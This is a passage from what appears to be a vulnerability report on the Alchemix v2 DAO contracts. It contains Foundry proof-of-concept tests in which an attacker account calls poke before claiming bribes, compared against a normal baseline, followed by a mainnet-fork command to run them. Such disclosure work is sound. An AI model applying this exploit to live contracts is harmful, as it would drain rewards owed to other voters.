        assertEq(earnedBribes0, 0, "no bribes should be earned yet"); 
        console2.log("earnedBribes0", earnedBribes0); 

        earnedBribes2 = IBribe(bribeAddress).earned(bal, tokenId2); 
        console2.log("earnedBribes2", earnedBribes2); 

        earnedBribes3 = IBribe(bribeAddress).earned(bal, tokenId3); 
        console2.log("earnedBribes3", earnedBribes3);

        console2.log("Fast forward 1 epoch"); 
        hevm.warp(newEpoch()); 
        
        hevm.startPrank(attacker);
        voter.poke(tokenId1);
        hevm.stopPrank();

        uint256 earnedBribes1 = IBribe(bribeAddress).earned(bal, tokenId1); 
        console2.log("earnedBribes1", earnedBribes1); 

        hevm.prank(attacker);
        voter.claimBribes(bribes, tokens, tokenId1);
        console2.log("Bal balance of attacker: %s", IERC20(bal).balanceOf(attacker)); 
        
        earnedBribes2 = IBribe(bribeAddress).earned(bal, tokenId2); 
        console2.log("earnedBribes2", earnedBribes2); 

        earnedBribes3 = IBribe(bribeAddress).earned(bal, tokenId3); 
        console2.log("earnedBribes3", earnedBribes3);        

        hevm.prank(Alice);
        voter.claimBribes(bribes, tokens, tokenId2);
        console2.log("Bal balance of Alice: %s", IERC20(bal).balanceOf(Alice)); 
        
        hevm.prank(Bob);
        voter.claimBribes(bribes, tokens, tokenId3); 
        console2.log("Bal balance of Bob: %s", IERC20(bal).balanceOf(Bob)); 
    
        console2.log("Bal balance of Bribe contract: %s", IERC20(bal).balanceOf(bribeAddress)); 
        
    }

    function testBribeClaimingPoke_Normal() public {

      
        address attacker = address(this) ; 
        uint256 tokenId1 = createVeAlcx(address(this), TOKEN_1, MAXTIME, false);
        uint256 tokenId2 = createVeAlcx(Alice, TOKEN_1, MAXTIME, false);
        tokenId3 = createVeAlcx(Bob, TOKEN_1, MAXTIME, false);
        address bribeAddress = voter.bribes(address(sushiGauge));

        // Add BAL bribes to sushiGauge
        createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);
        console2.log("Bal balance of Bribe contract: %s", IERC20(bal).balanceOf(bribeAddress)); 

        address[] memory pools = new address[](1);
        pools[0] = sushiPoolAddress;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 5000;

        address[] memory bribes = new address[](1);
        bribes[0] = address(bribeAddress);
        address[][] memory tokens = new address[][](2);
        tokens[0] = new address[](1);
        tokens[0][0] = bal;

        hevm.prank(attacker);
        voter.vote(tokenId1, pools, weights, 0);
        
        hevm.prank(Alice);
        voter.vote(tokenId2, pools, weights, 0);

        hevm.prank(Bob);
        voter.vote(tokenId3, pools, weights, 0);

        uint256 earnedBribes0 = IBribe(bribeAddress).earned(bal, tokenId1); 

        assertEq(earnedBribes0, 0, "no bribes should be earned yet"); 
        console2.log("earnedBribes0", earnedBribes0); 

        earnedBribes2 = IBribe(bribeAddress).earned(bal, tokenId2); 
        console2.log("earnedBribes2", earnedBribes2); 

        earnedBribes3 = IBribe(bribeAddress).earned(bal, tokenId3); 
        console2.log("earnedBribes3", earnedBribes3);
        
        console2.log("Fast forward 1 epoch"); 
        // Start second epoch
        hevm.warp(newEpoch()); 
        
        uint256 earnedBribes1 = IBribe(bribeAddress).earned(bal, tokenId1); 
        console2.log("earnedBribes1", earnedBribes1); 
        
         earnedBribes2 = IBribe(bribeAddress).earned(bal, tokenId2); 
        console2.log("earnedBribes2", earnedBribes2); 

         earnedBribes3 = IBribe(bribeAddress).earned(bal, tokenId3); 
        console2.log("earnedBribes3", earnedBribes3); 

        hevm.prank(attacker);
        voter.claimBribes(bribes, tokens, tokenId1);
        console2.log("Bal balance of attacker: %s", IERC20(bal).balanceOf(attacker)); 

        hevm.prank(Alice);
        voter.claimBribes(bribes, tokens, tokenId2);
        console2.log("Bal balance of Alice: %s", IERC20(bal).balanceOf(Alice)); 
        
        hevm.prank(Bob);
        voter.claimBribes(bribes, tokens, tokenId3); 
        console2.log("Bal balance of Bob: %s", IERC20(bal).balanceOf(Bob)); 
        console2.log("Bal balance of Bribe contract: %s", IERC20(bal).balanceOf(bribeAddress)); 

        
    }
```

To run the test, just copy the test code in the file:

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/test/Voting.t.sol>

Then run the command:

```
FOUNDRY_PROFILE=default forge test --fork-url https://rpc.ankr.com/eth --match-path src/test/Voting.t.sol --match-test testBribeClaimingPoke  --fork-block-number 19858400 -vvvvv | format > testBribeClaimingPoke_240513_1000.log

```

Full Log: <https://drive.google.com/file/d/1zU9SNWECqE7S\\_eZRMjFOg1Ha-CNvyxHv/view?usp=sharing>

Full log with debug information: <https://drive.google.com/file/d/1cBNi1a0Um1G0OTCny7KvnpUbXq1FEs1-/view?usp=sharing>
